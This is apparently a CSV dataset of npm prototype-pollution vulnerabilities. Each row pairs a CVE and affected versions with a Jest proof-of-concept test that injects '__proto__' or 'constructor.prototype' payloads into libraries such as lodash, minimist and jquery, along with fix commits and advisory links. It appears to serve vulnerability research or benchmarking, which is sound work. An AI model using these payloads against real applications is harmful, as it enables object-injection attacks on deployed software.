+prototype-pollution,CVE-2020-7772,doc-path,2.0.0,2.3.0,prototype-pollution/doc-path_2.0.0,"//https://snyk.io/vuln/SNYK-JS-DOCPATH-1011952
+test(""prototype pollution in doc-path"", () => {
+  const path = require(""doc-path"");
+  let obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  path.setPath({}, ""__proto__.polluted"", ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/mrodrig/doc-path/commit/3e2bb168cf303bffcd7fae5f8d05e5300c1541c7,src/path.js:54:27,https://security.snyk.io/vuln/SNYK-JS-DOCPATH-1011952; https://github.com/advisories/GHSA-gm8g-xhh8-rmwr
+prototype-pollution,CVE-2018-16487,lodash,4.17.9,4.17.11,prototype-pollution/lodash_4.17.9,"//https://hackerone.com/reports/380873
+test(""prototype pollution in lodash"", () => {
+  const _ = require(""lodash"");
+  let payload = JSON.parse(
+    '{""constructor"": {""prototype"": {""polluted"": ""yes""}}}'
+  );
+  expect({}.polluted).toBe(undefined);
+  _.merge({}, payload);
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad,lodash.js:2573:21,https://hackerone.com/reports/380873; https://security.snyk.io/vuln/SNYK-JS-LODASH-73638; https://github.com/advisories/GHSA-h726-x36v-rx45
+prototype-pollution,CVE-2020-28273,set-in,1.0.0,2.0.1,prototype-pollution/set-in_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28273
+test(""prototype pollution in set-in"", () => {
+  const si = require(""set-in"");
+  const obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  si(obj, [""__proto__"", ""polluted""], ""yes"");
+  expect(obj.polluted).toBe(""yes"");
+});
+",https://github.com/ahdinosaur/set-in/commit/e431effa00195a6f06b111e09733cd1445a91a88,index.js:41:17,https://security.snyk.io/vuln/SNYK-JS-SETIN-1048049; https://github.com/advisories/GHSA-qr4p-c9wr-phr6
+prototype-pollution,,nested-property,0.0.5,3.0.0,prototype-pollution/nested-property_0.0.5,"//https://snyk.io/test/npm/nested-property/0.0.5
+
+test(""prototype pollution in nested-property"", () => {
+  const nestedProperty = require(""nested-property"");
+  const object1 = {};
+  expect({}.polluted).toBe(undefined);
+  nestedProperty.set(object1, ""__proto__.polluted"", ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/cosmosio/nested-property/commit/881cf37eb956641fc26011ff66a436eb603c89d1,index.js:95:27,https://security.snyk.io/vuln/SNYK-JS-NESTEDPROPERTY-1022154; 
+prototype-pollution,CVE-2018-16486,defaults-deep,0.2.4,n/a,prototype-pollution/defaults-deep_0.2.4,"//https://hackerone.com/reports/380878
+test(""prototype pollution in defaults-deep "", () => {
+  const defaultsDeep = require(""defaults-deep"");
+
+  let obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  let payload = JSON.parse(
+    '{""constructor"": {""prototype"": {""polluted"": ""yes""}}}'
+  );
+  defaultsDeep({}, payload);
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:26:21,https://security.snyk.io/vuln/SNYK-JS-DEFAULTSDEEP-173661; https://github.com/advisories/GHSA-pjxw-22xf-6pwc
+prototype-pollution,CVE-2020-7719,locutus,2.0.11,2.0.12,prototype-pollution/locutus_2.0.11,"//https://snyk.io/vuln/SNYK-JS-LOCUTUS-598675
+test(""prototype pollution in locutus"", () => {
+  try {
+    polluted;
+    expect(true).toBe(false);
+  } catch (e) {
+    expect(true).toBe(true);
+  }
+
+  const locutus = require(""locutus"");
+  locutus.php.strings.parse_str(""__proto__[polluted]=yes"");
+
+  expect(polluted).toBe(""yes"");
+});
+",n/a,,https://security.snyk.io/vuln/SNYK-JS-LOCUTUS-598675; https://github.com/advisories/GHSA-f98m-q3hr-p5wq
+prototype-pollution,CVE-2021-23452,x-assign,0.1.4,n/a,prototype-pollution/x-assign_0.1.4,"//https://security.snyk.io/vuln/SNYK-JS-XASSIGN-1759314
+test(""prototype pollution in x-assign"", () => {
+  const XAssign = require(""x-assign"");
+
+  expect({}.polluted).toBe(undefined);
+
+  const a = { red: ""apple"" };
+  const b = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');
+  const c = XAssign.assign(a, b);
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:34:20,https://security.snyk.io/vuln/SNYK-JS-XASSIGN-1759314; https://github.com/advisories/GHSA-4mvj-rq4v-2fxw
+prototype-pollution,CVE-2018-3753,merge-objects,1.0.3,n/a,prototype-pollution/merge-objects_1.0.3,"//https://snyk.io/vuln/npm:merge-objects:20180415
+test(""prototype pollution in merge-objects"", () => {
+  const merge = require(""merge-objects"");
+  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
+
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  merge({}, JSON.parse(malicious_payload));
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,merge-objects.js:20:20,https://security.snyk.io/vuln/npm:merge-objects:20180415; https://github.com/advisories/GHSA-fp82-2h99-3fpp
+prototype-pollution,CVE-2020-7771,asciitable.js,1.0.2,1.0.3,prototype-pollution/asciitable.js_1.0.2,"//https://snyk.io/vuln/SNYK-JS-ASCIITABLEJS-1039799
+test(""Prototype pollution in asciitable.js"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const req = require(""asciitable.js"");
+  const b = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
+  req({}, b);
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,asciitable.umd.js:50:104,https://security.snyk.io/vuln/SNYK-JS-ASCIITABLEJS-1039799; https://github.com/advisories/GHSA-5pxj-mhwj-x5gv
+prototype-pollution,CVE-2020-28499,merge,2.1.0,n/a,prototype-pollution/merge_2.1.0,"//https://snyk.io/vuln/SNYK-JS-MERGE-1042987
+
+test(""prototype pollution in merge"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const merge = require(""merge"");
+  const payload2 = JSON.parse('{""x"": {""__proto__"":{""polluted"":""yes""}}}');
+  let obj1 = { x: { y: 1 } };
+  merge.recursive(obj1, payload2);
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/src/index.js:59:19,https://security.snyk.io/vuln/SNYK-JS-MERGE-1042987; https://github.com/advisories/GHSA-7wpw-2hjm-89gp
+prototype-pollution,,objnest,5.0.0,5.1.0,prototype-pollution/objnest_5.0.0,"//https://github.com/okunishinishi/node-objnest/pull/6
+test(""prototype pollution in objnest"", () => {
+  const objnest = require(""objnest"");
+
+  let obj = {};
+  expect({}.polluted).toBe(undefined);
+
+  objnest.expand({ ""__proto__.polluted"": ""yes"" });
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/okunishinishi/node-objnest/commit/c541e1a775b562d63402a14dac9f8cbc52b116d7,lib/objnest.js:44:35,https://security.snyk.io/vuln/SNYK-JS-OBJNEST-1041787; 
+prototype-pollution,CVE-2021-25927,flat,5.0.0,2.0.2,prototype-pollution/flat_5.0.0,"//https://snyk.io/vuln/SNYK-JS-FLAT-596927
+test(""prototype pollution in flat"", () => {
+  var unflatten = require(""flat"").unflatten;
+
+  expect({}.polluted).toBe(undefined);
+
+  unflatten({
+    ""__proto__.polluted"": ""yes"",
+  });
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/jessie-codes/safe-flat/commit/4b9b7db976bba8c968354f4315f5f9c219b7cbf3,index.js:145:21,https://security.snyk.io/vuln/SNYK-JS-FLAT-596927; https://github.com/advisories/GHSA-33rv-m2gp-mm2r
+prototype-pollution,CVE-2021-25928,safe-obj,1.0.0,n/a,prototype-pollution/safe-obj_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25928
+
+test(""prototype pollution in safeObj"", () => {
+  var safeObj = require(""safe-obj"");
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  safeObj.expand(obj, ""__proto__.polluted"", ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/index.js:122:28,https://security.snyk.io/vuln/SNYK-JS-SAFEOBJ-1277111; https://github.com/advisories/GHSA-wpgh-hmv4-r3v5
+prototype-pollution,CVE-2020-7751,pathval,1.1.0,1.1.1,prototype-pollution/pathval_1.1.0,"//https://snyk.io/vuln/SNYK-JS-PATHVAL-596926
+test(""prototype pollution in pathval"", () => {
+  var pathval = require(""pathval"");
+
+  var obj = {};
+  expect({}.polluted).toBe(undefined);
+
+  pathval.setPathValue(obj, ""__proto__.polluted"", ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/chaijs/pathval/commit/7859e0e1ce4c2c67de897edce097ed31f80661d0,index.js:158:25,https://security.snyk.io/vuln/SNYK-JS-PATHVAL-596926; 
+prototype-pollution,CVE-2021-23444,jointjs,3.4.0,3.4.2,prototype-pollution/jointjs_3.4.0,"//https://security.snyk.io/vuln/SNYK-JS-JOINTJS-1579578
+test(""prototype pollution in jointjs"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const jointjs = require(""jointjs"");
+  jointjs.util.setByPath({}, [[""__proto__""], ""polluted""], ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+
+// jointjs.util.setByPath({}, 'proto/polluted', 'yes');
+// jointjs.util.setByPath({}, ['proto', 'polluted'], 'yes');
+// console.log(polluted); // ReferenceError: polluted is not defined
+",https://github.com/clientIO/joint/commit/e5bf89efef6d5ea572d66870ffd86560de7830a8,dist/joint.min.js:8:103865,https://security.snyk.io/vuln/SNYK-JS-JOINTJS-1579578; https://github.com/advisories/GHSA-f3pp-32qc-36w4
+prototype-pollution,CVE-2020-7765,@firebase/util,0.3.3,0.3.4,prototype-pollution/firebase-util_0.3.3-canary.c47ba31d0,"//https://security.snyk.io/vuln/SNYK-JS-FIREBASEUTIL-1038324
+test(""prototype pollution in @firebase/util"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const util = require(""@firebase/util"");
+  var payload = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');
+
+  const a = {
+    nest: {
+      number: 1,
+      string: ""1"",
+      object: { key: ""1"" },
+      date: new Date(1),
+      nest: {
+        a: 1,
+      },
+    },
+  };
+
+  var result = util.deepExtend(a, payload);
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/firebase/firebase-js-sdk/commit/9cf727fcc3d049551b16ae0698ac33dc2fe45ada,util/src/deepCopy.ts:68:49,https://security.snyk.io/vuln/SNYK-JS-FIREBASEUTIL-1038324; https://github.com/advisories/GHSA-fpm5-vv97-jfwg
+prototype-pollution,CVE-2020-7598,minimist,1.0.0,0.2.1,prototype-pollution/minimist_1.0.0,"//https://snyk.io/vuln/SNYK-JS-MINIMIST-559764
+test(""prototype pollution in minimist"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  require(""minimist"")(""--__proto__.polluted yes"".split("" ""));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:189:16,https://security.snyk.io/vuln/SNYK-JS-MINIMIST-559764; https://github.com/advisories/GHSA-vh95-rmgr-6w4m
+prototype-pollution,CVE-2021-25945,js-extend,0.0.1,n/a,prototype-pollution/js-extend_0.0.1,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25945
+test(""prototype pollution in js-extend"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const jsExtend = require(""js-extend"");
+  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
+  jsExtend.extend({}, JSON.parse(malicious_payload));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,extend.js:17:23,https://security.snyk.io/vuln/SNYK-JS-JSEXTEND-1297101; https://github.com/advisories/GHSA-mh82-55cm-6gfh
+prototype-pollution,CVE-2018-16472,cached-path-relative,1.0.1,1.0.2,prototype-pollution/cached-path-relative_1.0.1,"//https://hackerone.com/reports/390847
+test(""prototype pollution in cached-path-relative"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  var relative = require(""cached-path-relative"");
+  relative(""__proto__"", ""polluted"");
+
+  expect({}.polluted).not.toBe(undefined);
+});
+",https://github.com/ashaffer/cached-path-relative/commit/a43cffec84ed0e9eceecb43b534b6937a8028fc0,lib/index.js:39:19,https://security.snyk.io/vuln/SNYK-JS-CACHEDPATHRELATIVE-72573; https://github.com/advisories/GHSA-hc9w-4p87-j549
+prototype-pollution,,ts-dot-prop,1.4.0,1.4.1,prototype-pollution/ts-dot-prop_1.4.0,"//https://hackerone.com/reports/980599
+test(""prototype pollution in ts-dot-prop"", () => {
+  const tsDot = require(""ts-dot-prop"");
+
+  let obj = {};
+  expect({}.polluted).toBe(undefined);
+
+  tsDot.set(obj, ""__proto__.polluted"", ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/justinlettau/ts-dot-prop/commit/816b887a669ab959c3c2f85c6563d33928f00f14#diff-f41e9d04a45c83f3b6f6e630f10117feR183,src/index.ts:72:21,https://security.snyk.io/vuln/SNYK-JS-TSDOTPROP-1024441; 
+prototype-pollution,,@lyngs/merge,1.0.9,n/a,prototype-pollution/lyngs-merge_1.0.9,"//https://security.snyk.io/vuln/SNYK-JS-LYNGSMERGE-1069823
+test(""prototype pollution in @lyngs/merge"", () => {
+  const { merge } = require(""@lyngs/merge"");
+  expect({}.polluted).toBe(undefined);
+  merge({ dummy: 1 }, JSON.parse(`{""__proto__"":{""polluted"":""yes""}}`));
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,merge/dist/index.js:2684:20,https://security.snyk.io/vuln/SNYK-JS-LYNGSMERGE-1069823; 
+prototype-pollution,CVE-2021-25946,nconf-toml,0.0.1,n/a,prototype-pollution/nconf-toml_0.0.1,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25946
+
+test(""prototype pollution in nconf-toml"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const nt = require(""nconf-toml"");
+  const fs = require(""fs"");
+  const path = require(""path"");
+
+  nt.parse(fs.readFileSync(path.resolve(__dirname, ""./payload.toml""), ""utf-8""));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/compiler.js:55:18,https://security.snyk.io/vuln/SNYK-JS-NCONFTOML-1296831; https://github.com/advisories/GHSA-hx7j-43w2-7rj7
+prototype-pollution,CVE-2020-8147,utils-extend,1.0.8,n/a,prototype-pollution/utils-extend_1.0.8,"//https://hackerone.com/reports/801522
+
+test(""prototype pollution in utils-extend"", () => {
+  const { extend } = require(""utils-extend"");
+  const payload = '{""__proto__"":{""polluted"":""yes""}}';
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  const pollutionObject = JSON.parse(payload);
+  extend({}, pollutionObject);
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:46:19,https://security.snyk.io/vuln/SNYK-JS-UTILSEXTEND-560385; https://github.com/advisories/GHSA-6pq3-928q-x6w6
+prototype-pollution,CVE-2020-28280,predefine,0.1.2,n/a,prototype-pollution/predefine_0.1.2,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28280
+test(""prototype pollution in predefine"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  var predefine = require(""predefine"");
+  const payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
+  predefine.merge({}, payload);
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:284:21,https://security.snyk.io/vuln/SNYK-JS-PREDEFINE-1054935; https://github.com/advisories/GHSA-mx3x-ghqm-r43h
+prototype-pollution,CVE-2020-28283,libnested,1.5.0,1.5.1,prototype-pollution/libnested_1.5.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28283
+test(""prototype pollution in libnested"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const libnested = require(""libnested"");
+  libnested.set({}, [""__proto__"", ""polluted""], ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/dominictarr/libnested/commit/9619863a319ed1e5c19ddcbdbe3312f9cef72760,index.js:27:20,https://security.snyk.io/vuln/SNYK-JS-LIBNESTED-1054930; https://github.com/advisories/GHSA-3r9x-mjrm-2725
+prototype-pollution,CVE-2021-25943,101,1.0.0,n/a,prototype-pollution/101_1.0.0,"test(""prototype pollution in 101/set"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const _101 = require(""101/set"");
+  // console.log(_101)
+  _101({}, ""__proto__.polluted"", ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:32:16,https://github.com/advisories/GHSA-cwcx-rxgc-cmw3; https://security.snyk.io/vuln/SNYK-JS-101-1292345
+prototype-pollution,CVE-2019-10808,utilitify,1.0.2,1.0.3,prototype-pollution/utilitify_1.0.2,"//https://snyk.io/vuln/SNYK-JS-UTILITIFY-559497
+test(""prototype pollution in utilitify"", () => {
+  const { mergeDeep } = require(""utilitify"");
+  var malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
+
+  expect({}.polluted).toBe(undefined);
+
+  var result = mergeDeep(
+    { a: { b: { c: ""c"", d: ""d"" } } },
+    { a: { b: JSON.parse(malicious_payload) } }
+  );
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/xcritical-software/utilitify/commit/88d6e27009823338bf319ffb768fe6b08e8ad2d1,utils/utils/mergeDeep.ts:17:18,https://security.snyk.io/vuln/SNYK-JS-UTILITIFY-559497; https://github.com/advisories/GHSA-9534-h433-2rjf
+prototype-pollution,CVE-2020-7727,gedi,1.6.3,n/a,prototype-pollution/gedi_1.6.3,"//https://snyk.io/vuln/SNYK-JS-GEDI-598803
+test(""prototype pollution in gedi"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const gedi = require(""gedi"");
+  gedi().set(""[__proto__/polluted]"", ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,gedi.js:393:32,https://security.snyk.io/vuln/SNYK-JS-GEDI-598803; https://github.com/advisories/GHSA-jh2m-j8pp-55rc
+prototype-pollution,CVE-2020-7724,tiny-conf,1.1.0,n/a,prototype-pollution/tiny-conf_1.1.0,"//https://snyk.io/vuln/SNYK-JS-TINYCONF-598792
+test(""prototype pollution in tinyConf"", () => {
+  const tinyConf = require(""tiny-conf"");
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  tinyConf.set(""__proto__.polluted"", ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,tiny-conf.js:73:17,https://security.snyk.io/vuln/SNYK-JS-TINYCONF-598792; https://github.com/advisories/GHSA-4q97-fh3f-j294
+prototype-pollution,,sahmat,1.0.0,n/a,prototype-pollution/sahmat_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25916
+test(""prototype pollution in sahmat"", () => {
+  const sahmat = require(""sahmat"");
+  let obj = { tmp: """" };
+
+  expect({}.polluted).toBe(undefined);
+
+  sahmat(obj, ""tmp"", (obj.__proto__.polluted = ""yes""));
+
+  expect(obj.tmp.polluted).toBe(""yes"");
+});
+",n/a,build/utils.js:391:28,https://github.com/advisories/GHSA-83pq-466j-fc6j; 
+prototype-pollution,CVE-2020-7718,gammautils,0.0.81,n/a,prototype-pollution/gammautils_0.0.81,"//https://snyk.io/vuln/SNYK-JS-GAMMAUTILS-598670
+test(""prototype pollution in gammautils"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const gammautils = require(""gammautils"");
+  var payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
+  gammautils.object.deepMerge({}, payload);
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/objectUtils.js:146:34,https://security.snyk.io/vuln/SNYK-JS-GAMMAUTILS-598670; https://github.com/advisories/GHSA-pgmg-gf5p-54j8
+prototype-pollution,CVE-2021-23509,json-ptr,1.1.0,3.0.0,prototype-pollution/json-ptr_1.1.0,"//https://snyk.io/vuln/SNYK-JS-JSONPTR-1016939
+test(""prototype pollution in json-ptr"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const { JsonPointer } = require(""json-ptr"");
+  JsonPointer.set({}, ""/constructor/prototype/polluted"", ""yes"", true);
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/flitbit/json-ptr/commit/5dc458fbad1c382a2e3ca6d62e66ede3d92849ca,index.js:277:26,https://security.snyk.io/vuln/SNYK-JS-JSONPTR-1577291; https://github.com/advisories/GHSA-8gwj-8hxc-285w
+prototype-pollution,CVE-2021-23434,object-path,0.11.4,0.11.6,prototype-pollution/object-path_0.11.4,"//https://security.snyk.io/vuln/SNYK-JS-OBJECTPATH-1569453
+test(""prototype pollution in object-path"", () => {
+  const objectPath = require(""object-path"");
+
+  expect({}.polluted).toBe(undefined);
+  objectPath.withInheritedProps.set({}, [[""__proto__""], ""polluted""], ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/mariocasciaro/object-path/commit/7bdf4abefd102d16c163d633e8994ef154cab9eb,index.js:110:28,https://security.snyk.io/vuln/SNYK-JS-OBJECTPATH-1569453; https://github.com/advisories/GHSA-v39p-96qg-c8rf
+prototype-pollution,CVE-2021-25914,object-collider,1.0.3,1.0.4,prototype-pollution/object-collider_1.0.3,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25914
+
+test(""prototype pollution in object-collider"", () => {
+  var { collide } = require(""object-collider"");
+  const payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  collide(obj, payload);
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/FireBlinkLTD/object-collider/commit/321f75a7f8e7b3393e5b7dd6dd9ab26ede5906e5,src/utils/CollideUtil.ts:83:22,https://security.snyk.io/vuln/SNYK-JS-OBJECTCOLLIDER-1080739; https://github.com/advisories/GHSA-85g2-29m8-qf2p
+prototype-pollution,CVE-2020-7700,phpjs,1.3.2,n/a,prototype-pollution/phpjs_1.3.2,"//https://snyk.io/vuln/SNYK-JS-PHPJS-598681
+
+test(""prototype pollution in phpjs"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const p = require(""phpjs"");
+  p.parse_str(""__proto__[polluted]=yes"", {});
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,build/npm.js:6406:24,https://security.snyk.io/vuln/SNYK-JS-PHPJS-598681; https://github.com/advisories/GHSA-m428-jqc4-2p5j
+prototype-pollution,CVE-2020-28272,keyget,2.2.0,2.3.0,prototype-pollution/keyget_2.2.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28272
+test(""prototype pollution in keyget"", () => {
+  var keyget = require(""keyget"");
+  var obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  keyget.set({}, ""__proto__.polluted"", ""yes"");
+  expect(obj.polluted).toBe(""yes"");
+});
+",https://github.com/rumkin/keyget/commit/17d15b6c75036eb429075a8cfeccfc18094dd2e2,index.js:111:17,https://security.snyk.io/vuln/SNYK-JS-KEYGET-1048048; 
+prototype-pollution,CVE-2021-26707,merge-deep,3.0.0,3.0.3,prototype-pollution/merge-deep_3.0.0,"// https://snyk.io/vuln/npm:merge-deep:20180215
+test(""prototype pollution in merge-deep"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const merge = require(""merge-deep"");
+  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
+  merge({}, JSON.parse(malicious_payload));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/jonschlinkert/merge-deep/commit/e370968581413a2e5ffdbbf7c2f5094e0e0b3861,index.js:45:19,https://security.snyk.io/vuln/SNYK-JS-MERGEDEEP-1070277; https://github.com/advisories/GHSA-r6rj-9ch6-g264
+prototype-pollution,CVE-2020-7774,y18n,3.2.1,5.0.5,prototype-pollution/y18n_3.2.1,"//https://snyk.io/test/npm/y18n/3.1.0
+
+test(""prototype pollution in y18n"", () => {
+  const y18n = require(""y18n"")();
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  y18n.setLocale(""__proto__"");
+  y18n.updateLocale({ polluted: ""yes"" }); //payload
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:156:34,https://security.snyk.io/vuln/SNYK-JS-Y18N-1021887; https://github.com/advisories/GHSA-c4w7-xm78-47vh
+prototype-pollution,CVE-2021-23402,record-like-deep-assign,1.0.1,n/a,prototype-pollution/record-like-deep-assign_1.0.1,"//https://security.snyk.io/vuln/SNYK-JS-RECORDLIKEDEEPASSIGN-1311024
+test(""prototype pollution in x-assign"", () => {
+  const deepAssign = require(""record-like-deep-assign"");
+
+  expect({}.polluted).toBe(undefined);
+
+  let obj = {};
+  EVIL_JSON = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
+  deepAssign({}, EVIL_JSON);
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,src/mod.ts:34:9,https://security.snyk.io/vuln/SNYK-JS-RECORDLIKEDEEPASSIGN-1311024; https://github.com/advisories/GHSA-7qm6-9v49-38m9
+prototype-pollution,CVE-2021-23820,json-pointer,0.6.1,n/a,prototype-pollution/json-pointer_0.6.1,"//https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-596925
+test(""prototype pollution in json-pointer"", () => {
+  const pointer = require(""json-pointer"");
+  let obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  pointer.set({}, [[""__proto__""], ""polluted""], ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",N/A,index.js:98:18,https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-1577287; https://github.com/advisories/GHSA-v5vg-g7rq-363w
+prototype-pollution,CVE-2020-7720,node-forge,0.9.0,0.10.0,prototype-pollution/node-forge_0.9.0,"//https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-609293
+test(""prototype pollution in node-forge"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const nodeforge = require(""node-forge"");
+  const obj = {};
+  nodeforge.util.setPath(obj, [""__proto__"", ""polluted""], ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/digitalbazaar/forge/commit/51228083550dde97701ac8e06c629a5184117562,lib/util.js:2536:22,https://security.snyk.io/vuln/SNYK-JS-NODEFORGE-598677; https://github.com/advisories/GHSA-92xj-mqp7-vmcj
+prototype-pollution,,lutils-merge,0.2.6,n/a,prototype-pollution/lutils-merge_0.2.6,"//https://hackerone.com/reports/439107
+test(""prototype pollution in lutils-merge"", () => {
+  const merge = require(""lutils-merge"");
+  const payload = '{""__proto__"":{""polluted"":""yes""}}';
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  merge({}, JSON.parse(payload));
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,merge.js:156:23,https://security.snyk.io/vuln/SNYK-JS-LUTILSMERGE-174783; https://github.com/advisories/GHSA-f7qw-5pvg-mmwp
+prototype-pollution, CVE-2021-25953,putil-merge,3.0.0,3.7.0,prototype-pollution/putil-merge_3.0.0,"//https://security.snyk.io/vuln/SNYK-JS-PUTILMERGE-1317077
+test(""prototype pollution in putil-merge"", () => {
+  const putil_merge = require(""putil-merge"");
+  const payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
+  var obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  putil_merge(obj, payload, { deep: true });
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/panates/putil-merge/commit/a8f5087faaa034cc2dc2e8070c13014ad6a34043,lib/merge.js:72:19,https://security.snyk.io/vuln/SNYK-JS-PUTILMERGE-1317077; https://github.com/advisories/GHSA-9x7m-9hpg-xxmw
+prototype-pollution,CVE-2020-7713,arr-flatten-unflatten,1.1.4,n/a,prototype-pollution/arr-flatten-unflatten_1.1.4,"//https://snyk.io/vuln/SNYK-JS-ARRFLATTENUNFLATTEN-598396
+test(""prototype pollution in arr-flatten-unflatten"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const { unflatten } = require(""arr-flatten-unflatten"");
+  unflatten({ ""__proto__.polluted"": ""yes"" });
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,unflatten.js:17:16,https://security.snyk.io/vuln/SNYK-JS-ARRFLATTENUNFLATTEN-598396; https://github.com/advisories/GHSA-w8f3-pvx4-4c3h
+prototype-pollution,CVE-2019-11358,jquery,1.11.0, 3.4.0,prototype-pollution/jquery_1.11.0,"//https://hackerone.com/reports/454365
+test(""prototype pollution in jquery"", () => {
+  const { JSDOM } = require(""jsdom"");
+  const { window } = new JSDOM("""");
+  const $ = require(""jquery"")(window);
+
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  $.extend(true, {}, JSON.parse('{""__proto__"": {""polluted"": ""yes""}}'));
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b,dist/jquery.js:230:21,https://security.snyk.io/vuln/SNYK-JS-JQUERY-174006; https://github.com/advisories/GHSA-6c3j-c64m-qhgq
+prototype-pollution,CVE-2020-7702,Templ8,0.7.0,n/a,prototype-pollution/Templ8_0.7.0,"//https://snyk.io/vuln/SNYK-JS-TEMPL8-598770
+test(""prototype pollution in Templ8"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const Templ8 = require(""Templ8"");
+  const tpl = new Templ8('{{__proto__.polluted=""yes""}}');
+  tpl.parse();
+
+  try {
+    expect(polluted).toBe(""yes"");
+  } catch {
+    expect(false).toBe(true);
+  }
+});
+",n/a,,https://security.snyk.io/vuln/SNYK-JS-TEMPL8-598770; https://github.com/advisories/GHSA-c7m7-4257-h698
+prototype-pollution,CVE-2020-28461,js-ini,1.2.0,1.3.0,prototype-pollution/js-ini_1.2.0,"//https://snyk.io/vuln/SNYK-JS-JSINI-1048970
+test(""prototype pollution in js-ini"", () => {
